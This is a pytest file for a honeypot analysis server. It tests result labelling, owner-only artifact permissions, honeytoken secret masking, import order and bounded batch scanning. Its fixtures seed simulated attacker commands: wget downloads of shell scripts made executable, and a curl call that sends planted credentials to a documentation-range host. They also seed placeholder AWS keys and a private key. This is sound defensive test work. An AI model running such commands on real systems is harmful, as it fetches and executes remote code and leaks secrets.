"""Result hygiene of the analysis tools: what they return, mask, write and hold in memory.

Covers the pieces that sit around the answers rather than in them:

* every tool that returns clipped attacker-written strings carries the same `untrusted_content`
  note, from one helper;
* artifacts are created owner-only (0600) from the first instant, whatever the umask;
* planted honeytoken secrets of every token type are masked, not only credential passwords;
* the tool modules import in any order (a fresh interpreter importing `tools.patterns` first used
  to die on a half-initialised module);
* a whole-capture scan folds its rows in batches and bounds what it keeps and how long it classifies.
"""

from __future__ import annotations

import json
import os
import stat
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

ROOT = Path(__file__).resolve().parents[2]


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db
    from honeypot_mcp.tools import _window

    event_buffer.reset_for_tests()
    await init_db()
    _window.reset_for_tests()
    yield
    _window.reset_for_tests()
    event_buffer.reset_for_tests()
    await close_db()


async def _seed(rows: list[tuple[str, str, dict[str, Any], datetime | None]]) -> None:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    async with get_session() as session:
        for event_type, ip, payload, ts in rows:
            session.add(
                Alert(
                    source_ip=ip,
                    event_type=event_type,
                    payload=payload,
                    severity=AlertSeverity.MEDIUM,
                    timestamp=ts or datetime.now(UTC),
                )
            )


async def _token(type_: str, value: str, meta: dict[str, Any], label: str = "bait") -> int:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeytoken, HoneytokenStatus, HoneytokenType

    async with get_session() as session:
        token = Honeytoken(
            type=HoneytokenType(type_),
            label=label,
            token_value=value,
            status=HoneytokenStatus.ACTIVE,
            token_meta=meta,
        )
        session.add(token)
        await session.flush()
        return token.id


def _command(text: str) -> dict[str, Any]:
    return {"input": text, "message": f"CMD: {text}", "protocol": "telnet"}


# ── one shared untrusted-content note ─────────────────────────────────────────


@pytest.mark.parametrize(
    "kind",
    ["credentials", "commands", "files", "clients", "sip_dialling", "http", "concentration"],
)
async def test_attack_patterns_marks_every_kind_untrusted(kind):
    from honeypot_mcp.tools._format import UNTRUSTED_CONTENT_NOTE
    from honeypot_mcp.tools.patterns import attack_patterns

    out = await attack_patterns(kind)  # type: ignore[arg-type]

    assert out["untrusted_content"] == UNTRUSTED_CONTENT_NOTE


async def test_bait_trips_and_extract_iocs_mark_their_results_untrusted():
    from honeypot_mcp.tools._format import UNTRUSTED_CONTENT_NOTE
    from honeypot_mcp.tools.ioc import extract_iocs
    from honeypot_mcp.tools.patterns import bait_trips

    assert (await bait_trips())["untrusted_content"] == UNTRUSTED_CONTENT_NOTE
    assert (await extract_iocs())["untrusted_content"] == UNTRUSTED_CONTENT_NOTE


async def test_pcap_detect_and_sample_scan_mark_their_results_untrusted():
    from honeypot_mcp import samples
    from honeypot_mcp.tools._format import UNTRUSTED_CONTENT_NOTE
    from honeypot_mcp.tools.detect import pcap_detect

    refused = await pcap_detect("does-not-exist.pcap")
    assert "error" in refused
    assert refused["untrusted_content"] == UNTRUSTED_CONTENT_NOTE

    if samples.availability()["available"]:
        from honeypot_mcp.config import get_settings
        from honeypot_mcp.tools.samples import sample_scan

        root = get_settings().samples_dir
        root.mkdir(mode=0o700, parents=True, exist_ok=True)
        (root / "note.txt").write_bytes(b"hello\n")
        scanned = await sample_scan()
        assert scanned["untrusted_content"] == UNTRUSTED_CONTENT_NOTE


async def test_pcap_analyze_says_the_same_thing_as_the_helper():
    """`pcap_analyze` was first; the helper's wording is its wording, so a client sees one string."""
    from honeypot_mcp.config import get_settings
    from honeypot_mcp.tools._format import UNTRUSTED_CONTENT_NOTE
    from honeypot_mcp.tools.pcap import pcap_analyze

    reports = get_settings().reports_dir
    reports.mkdir(parents=True, exist_ok=True)
    header = bytes.fromhex("d4c3b2a1020004000000000000000000ffff000001000000")
    (reports / "empty.pcap").write_bytes(header)

    out = await pcap_analyze("empty.pcap")

    assert out["untrusted_content"] == UNTRUSTED_CONTENT_NOTE


# ── artifacts are owner-only ──────────────────────────────────────────────────


def _mode(path: str | Path) -> int:
    return stat.S_IMODE(os.stat(path).st_mode)


def test_artifacts_are_created_owner_only_whatever_the_umask():
    from honeypot_mcp.tools._format import write_artifact

    previous = os.umask(0o022)  # the default that used to make them 0644
    try:
        generated = write_artifact("a\n", prefix="t", extension="txt")
        named = write_artifact("b\n", prefix="t", extension="txt", output_path="named.txt")
    finally:
        os.umask(previous)

    assert _mode(generated["path"]) == 0o600
    assert _mode(named["path"]) == 0o600
    assert Path(named["path"]).read_text() == "b\n", "the owner can still read it"


def test_replacing_a_world_readable_artifact_tightens_it_and_a_named_one_is_never_replaced():
    from honeypot_mcp.config import get_settings
    from honeypot_mcp.tools._format import write_artifact

    reports = get_settings().reports_dir
    reports.mkdir(parents=True, exist_ok=True)
    old = reports / "old.txt"
    old.write_text("old\n")
    old.chmod(0o644)

    replaced = write_artifact(
        "new\n", prefix="t", extension="txt", output_path="old.txt", overwrite=True
    )
    assert "error" not in replaced and _mode(old) == 0o600 and old.read_text() == "new\n"

    refused = write_artifact("evil\n", prefix="t", extension="txt", output_path="old.txt")
    assert "already exists" in refused["error"]
    assert old.read_text() == "new\n", "a refused write leaves the existing file alone"


async def test_the_navigator_layer_file_is_owner_only_and_readable_by_its_owner():
    from honeypot_mcp.tools.analysis import generate_report

    await _seed([("ssh_login_failed", "192.0.2.1", {"username": "root"}, None)])

    out = await generate_report(format="attack_navigator")

    assert _mode(out["path"]) == 0o600
    assert json.loads(Path(out["path"]).read_text())["domain"] == "enterprise-attack"


# ── viewer-tier writers are not advertised as read-only ───────────────────────


async def test_no_read_only_tool_writes_a_file():
    """Derived from the code: a tool whose source writes an artifact must not claim readOnlyHint.
    Viewer-tier `generate_report` (its attack_navigator format included) writes confined report
    files by design (documented in CLAUDE.md); what matters is that a client auto-approving
    read-only tools is never asked to trust one of them."""
    import inspect
    import re

    from honeypot_mcp.server import mcp

    writes = re.compile(r"write_artifact\(|\.write_text\(|\.write_bytes\(|open\([^)]*[\"']w")
    tools = {t.name: t for t in await mcp.list_tools()}
    for name, tool in tools.items():
        if tool.fn is None:
            continue
        if writes.search(inspect.getsource(tool.fn)):
            assert tool.annotations.readOnlyHint is False, name
    assert tools["generate_report"].annotations.readOnlyHint is False


# ── planted secrets of every token type are masked ────────────────────────────

_SECRETS: dict[str, tuple[str, dict[str, Any], list[str]]] = {
    "credential": (
        "cred:0123456789abcdef",
        {"credentials": [{"username": "svc_a1", "password": "Pl4nted-Passw0rd", "service": "ssh"}]},
        ["Pl4nted-Passw0rd"],
    ),
    "api_key": (
        "AKIAEXAMPLEKEYID123:wJalrXUtnFEMI-K7MDENG-bPxRfiCYEXAMPLEKEY",
        {
            "service": "aws",
            "access_key_id": "AKIAEXAMPLEKEYID123",
            "secret_access_key": "wJalrXUtnFEMI-K7MDENG-bPxRfiCYEXAMPLEKEY",
        },
        ["AKIAEXAMPLEKEYID123", "wJalrXUtnFEMI-K7MDENG-bPxRfiCYEXAMPLEKEY"],
    ),
    "jwt": (
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.c2lnbmF0dXJl",
        {"jti": "jti-7777-8888"},
        ["eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.c2lnbmF0dXJl", "jti-7777-8888"],
    ),
    "canary_url": (
        "http://canary.example:8888/t/abcd1234efgh",
        {"full_url": "http://canary.example:8888/t/abcd1234efgh", "token_id": "abcd1234efgh"},
        ["http://canary.example:8888/t/abcd1234efgh"],
    ),
    "slack_webhook": (
        "https://hooks.example.test/services/T000/B000/XXXXsecretXXXX",
        {"full_url": "https://hooks.example.test/services/T000/B000/XXXXsecretXXXX"},
        ["https://hooks.example.test/services/T000/B000/XXXXsecretXXXX"],
    ),
    "kubeconfig": (
        "apiVersion: v1\nkind: Config\n",
        {"bearer_token": "kubetoken-ABCDEF123456", "token_id": "kube-tok-4242"},
        ["kubetoken-ABCDEF123456", "kube-tok-4242"],
    ),
    "azure_credential": (
        "[azure]\n",
        {
            "client_secret": "az~Secret_value-123456",
            "client_id": "11111111-2222-3333-4444-555555555555",
        },
        ["az~Secret_value-123456", "11111111-2222-3333-4444-555555555555"],
    ),
    "gcp_service_account": (
        json.dumps(
            {
                "type": "service_account",
                "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\nKcwggSjAgEAAoIBAQC7notarealkeyAA\n-----END PRIVATE KEY-----\n",
                "private_key_id": "0123456789abcdef0123",
            }
        ),
        {"private_key_id": "0123456789abcdef0123"},
        [
            "KcwggSjAgEAAoIBAQC7notarealkeyAA",
            "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCKcwggSjAgEAAoIBAQC7notarealkeyAA",
            "0123456789abcdef0123",
        ],
    ),
    "file": (
        "uid-file-fff111",
        {
            "token_uid": "uid-file-fff111",
            "tracking_url": "http://canary.example:8888/t/uid-file-fff111.png",
        },
        ["uid-file-fff111"],
    ),
    "db_row": (
        "jane.canary@corp.example",
        {"canary_email": "jane.canary@corp.example"},
        ["jane.canary@corp.example"],
    ),
}


async def test_every_token_types_secret_is_masked_in_a_captured_command():
    from honeypot_mcp.tools.patterns import attack_patterns

    ids: dict[str, int] = {}
    for type_, (value, meta, _secrets) in _SECRETS.items():
        ids[type_] = await _token(type_, value, meta, label=f"bait-{type_}")
    rows = []
    for i, (_type, (_value, _meta, secrets)) in enumerate(_SECRETS.items()):
        for secret in secrets:
            flat = secret.replace("\n", " ")
            rows.append(
                (
                    "telnet_command_input",
                    f"203.0.113.{i + 1}",
                    _command(f"curl -u x:{flat} http://203.0.113.99/p"),
                    None,
                )
            )
    await _seed(rows)

    out = await attack_patterns("commands", top=100)
    blob = json.dumps(out)

    for type_, (_value, _meta, secrets) in _SECRETS.items():
        for secret in secrets:
            assert secret.replace("\n", " ") not in blob, (type_, secret)
        assert f"[masked: planted honeytoken #{ids[type_]}]" in blob, type_
    assert out["count"] == len(rows), "masking never drops an event"


async def test_an_ssh_key_fingerprint_is_public_and_stays_visible():
    """Documented limit: the stored value of an `ssh_key` token is a public fingerprint."""
    from honeypot_mcp.tools._planted import load_planted

    await _token(
        "ssh_key", "SHA256:publicfingerprintvalue", {"fingerprint": "SHA256:publicfingerprintvalue"}
    )

    planted = await load_planted()

    assert planted.redact("ssh -i x SHA256:publicfingerprintvalue") == (
        "ssh -i x SHA256:publicfingerprintvalue"
    )


async def test_masking_is_longest_secret_first_and_ignores_text_that_merely_resembles_one():
    from honeypot_mcp.tools._planted import load_planted

    tid = await _token(
        "canary_url",
        "http://canary.example:8888/t/abcd1234efgh",
        {"full_url": "http://canary.example:8888/t/abcd1234efgh", "token_id": "abcd1234efgh"},
    )
    planted = await load_planted()

    full = planted.redact("curl http://canary.example:8888/t/abcd1234efgh")
    assert full == f"curl [masked: planted honeytoken #{tid}]", "the URL is one match, not two"
    assert planted.redact("curl http://canary.example:8888/t/other") == (
        "curl http://canary.example:8888/t/other"
    )


async def test_bait_trips_masks_a_planted_secret_inside_a_user_agent():
    from honeypot_mcp.tools.patterns import bait_trips

    secret = "wJalrXUtnFEMI-K7MDENG-bPxRfiCYEXAMPLEKEY"
    await _token("api_key", f"AKIAX:{secret}", {"service": "aws", "secret_access_key": secret})
    await _token(
        "credential",
        "cred:feedface",
        {
            "credentials": [
                {"username": "svc_b2", "password": "Another-Planted-Pw", "service": "ssh"}
            ]
        },
    )
    trip_at = datetime.now(UTC) - timedelta(hours=1)
    await _seed(
        [
            (
                "http_probe",
                "192.0.2.10",
                {"user_agent": f"scanner/{secret}", "path": "/"},
                trip_at - timedelta(hours=2),
            ),
            (
                "honeytoken_triggered_credential_via_ssh_login_success",
                "192.0.2.10",
                {"username": "svc_b2", "password": "Another-Planted-Pw"},
                trip_at,
            ),
        ]
    )

    out = await bait_trips()

    blob = json.dumps(out)
    assert secret not in blob and "Another-Planted-Pw" not in blob
    agents = out["tokens"][0]["sources"][0]["lead_up"]["user_agents"]
    assert agents and "[masked: planted honeytoken #" in agents[0]


# ── the tool modules import in any order ──────────────────────────────────────


def _tool_modules() -> list[str]:
    import honeypot_mcp.tools as tools_pkg

    directory = Path(tools_pkg.__file__).parent
    return sorted(p.stem for p in directory.glob("*.py") if p.stem != "__init__")


def test_every_tool_module_imports_first_in_a_fresh_interpreter():
    """`tools.patterns` imports the server, the server imports every tool, and `tools.ioc` used to
    import private helpers back out of the half-initialised `patterns`."""
    env = {**os.environ, "DATABASE_URL": "sqlite+aiosqlite:///:memory:"}
    modules = _tool_modules()
    assert {"patterns", "ioc", "samples", "detect"} <= set(modules)

    def run(module: str) -> tuple[str, int, str]:
        proc = subprocess.run(
            [sys.executable, "-c", f"import honeypot_mcp.tools.{module}"],
            capture_output=True,
            text=True,
            env=env,
            cwd=ROOT,
            timeout=180,
        )
        return module, proc.returncode, proc.stderr[-400:]

    with ThreadPoolExecutor(max_workers=4) as pool:
        failures = [(m, err) for m, code, err in pool.map(run, modules) if code != 0]
    assert not failures, failures


# ── a scan folds rows in batches and bounds what it keeps ─────────────────────


async def _commands_seed(n: int = 12) -> None:
    await _seed(
        [
            (
                "telnet_command_input" if i % 2 else "ssh_command_input",
                f"203.0.113.{i % 5 + 1}",
                _command(
                    f"wget http://203.0.113.{i % 7 + 1}/p{i % 6}.sh; chmod +x p{i % 6}.sh"
                    if i % 3
                    else f"echo hello-{i % 4}"
                ),
                None,
            )
            for i in range(n)
        ]
    )


async def test_the_batch_size_never_changes_a_scan_answer(monkeypatch):
    from honeypot_mcp.tools import patterns

    await _commands_seed(40)
    expected = await patterns.attack_patterns("commands", top=50)  # type: ignore[arg-type]
    monkeypatch.setattr(patterns, "_BATCH_ROWS", 1)

    out = await patterns.attack_patterns("commands", top=50)  # type: ignore[arg-type]

    for key in ("classes", "staging_hosts", "distinct_commands", "distinct_sources", "count"):
        assert out[key] == expected[key], key
    assert out["scan"]["complete"] is True


async def test_a_key_text_budget_caps_what_a_scan_keeps_and_says_so(monkeypatch):
    from honeypot_mcp.tools import patterns

    await _seed(
        [
            ("telnet_command_input", "203.0.113.1", _command(f"echo {i:04d}-{'x' * 30}"), None)
            for i in range(10)
        ]
    )
    monkeypatch.setattr(patterns, "_MAX_KEY_CHARS", 100)  # room for two 40-character commands

    out = await patterns.attack_patterns("commands", top=50)  # type: ignore[arg-type]

    assert out["distinct_commands"] == 2
    assert out["scan"]["complete"] is False
    assert out["scan"]["events_scanned"] == 10, "events past the cap are still counted as scanned"
    assert "distinct values" in out["note"] and "100" in out["note"]


async def test_classification_has_its_own_time_budget_and_reports_what_it_skipped(monkeypatch):
    from honeypot_mcp.tools import patterns

    await _commands_seed(30)
    monkeypatch.setattr(patterns, "_CLASSIFY_SHARE", 0.0)
    monkeypatch.setattr(patterns, "_CLASSIFY_MIN_SECONDS", 0.0)

    out = await patterns.attack_patterns("commands", top=50)  # type: ignore[arg-type]

    assert out["classes"] == [], "the budget was spent before the first command"
    assert out["unclassified"]["events"] == 30 and out["unclassified"]["distinct_commands"] > 0
    assert out["count"] == 30, "the events are still counted"
    assert out["scan"]["complete"] is False
    assert "classif" in out["note"].lower()


async def test_a_partly_spent_classification_budget_keeps_the_most_frequent_commands(monkeypatch):
    import time

    from honeypot_mcp.tools import patterns

    rows = [("ssh_command_input", "203.0.113.1", _command("echo common"), None)] * 5
    rows += [
        ("ssh_command_input", "203.0.113.2", _command(f"echo rare-{i}"), None) for i in range(6)
    ]
    await _seed(rows)
    real = patterns.classify_command

    def slow(command: str) -> tuple[str, list[str]]:
        time.sleep(0.05)
        return real(command)

    monkeypatch.setattr(patterns, "classify_command", slow)
    monkeypatch.setattr(patterns, "_CLASSIFY_CHECK_EVERY", 2)
    monkeypatch.setattr(patterns, "_CLASSIFY_SHARE", 0.0)
    monkeypatch.setattr(patterns, "_CLASSIFY_MIN_SECONDS", 0.08)

    out = await patterns.attack_patterns("commands", top=50)  # type: ignore[arg-type]

    shown = {c["command"] for cls in out["classes"] for c in cls["top_commands"]}
    assert "echo common" in shown, "the most frequent command is classified first"
    assert 0 < out["unclassified"]["distinct_commands"] < 7
    assert out["count"] == 11


async def test_collapsed_ioc_batches_do_not_change_the_answer(monkeypatch):
    from honeypot_mcp.tools import ioc

    await _commands_seed(30)
    expected = await ioc.extract_iocs(limit=100)
    monkeypatch.setattr(ioc, "_COLLAPSED_BATCH", 1)

    out = await ioc.extract_iocs(limit=100)

    for key in ("urls", "hosts", "sha256", "distinct", "scanned_alerts", "scan_capped"):
        assert out[key] == expected[key], key


async def test_an_ioc_slice_stopped_between_batches_reports_exactly_what_it_read(monkeypatch):
    from honeypot_mcp.tools import ioc

    await _seed(
        [
            (
                "ssh_command_input",
                f"203.0.113.{i + 1}",
                _command(f"wget http://203.0.113.200/f{i}.sh"),
                None,
            )
            for i in range(6)
        ]
    )
    monkeypatch.setattr(ioc, "_COLLAPSED_BATCH", 2)
    calls = {"n": 0}

    def expired(_deadline: float) -> bool:
        calls["n"] += 1
        return calls["n"] > 1  # the slice may start; it must stop before its second batch

    monkeypatch.setattr(ioc, "_expired", expired)
    monkeypatch.setattr(ioc, "_scan_workers", lambda: 1)

    out = await ioc.extract_iocs(limit=100)

    unread = out["scan"]["not_fully_read"]
    assert out["scan_capped"] is True and out["scan"]["complete"] is False
    assert [u["event_type"] for u in unread] == ["ssh_command_input"]
    assert unread[0]["events_scanned"] == 2 and unread[0]["events_in_scope"] == 6


async def _peak_python_bytes(call) -> int:
    """Peak Python-level allocation while `call()` runs (SQLite's own memory is not traced)."""
    import gc
    import tracemalloc

    gc.collect()
    tracemalloc.start()
    try:
        await call()
        return tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()


async def test_a_collapsed_ioc_slice_is_held_a_batch_at_a_time():
    """A slice of distinct 8,000-character commands used to be fetched whole (`.all()`): 60,000 of them
    were about a gigabyte before the first was parsed. Batching holds a few hundred."""
    from honeypot_mcp.tools import ioc

    await _seed(
        [
            (
                "ssh_command_input",
                f"203.0.113.{i % 200 + 1}",
                _command(f"wget http://203.0.113.9/{i}.sh; {'x' * 8000}{i}"),
                None,
            )
            for i in range(1500)
        ]
    )

    peak = await _peak_python_bytes(lambda: ioc.extract_iocs(limit=5))

    assert peak < 12_000_000, f"{peak:,} bytes: the slice was not folded in batches"


async def test_a_commands_scan_holds_a_batch_of_rows_not_a_slice(monkeypatch):
    from honeypot_mcp.tools import patterns

    await _seed(
        [
            (
                "ssh_command_input",
                f"203.0.113.{i % 200 + 1}",
                _command(f"echo {'y' * 3900}{i:05d}"),
                None,
            )
            for i in range(2500)
        ]
    )
    monkeypatch.setattr(patterns, "_BATCH_ROWS", 50)
    monkeypatch.setattr(
        patterns, "_MAX_KEY_CHARS", 500_000
    )  # keep ~125 keys; the rest only counted

    peak = await _peak_python_bytes(lambda: patterns.attack_patterns("commands", top=5))  # type: ignore[arg-type]

    assert peak < 4_000_000, f"{peak:,} bytes: the whole slice was materialised"
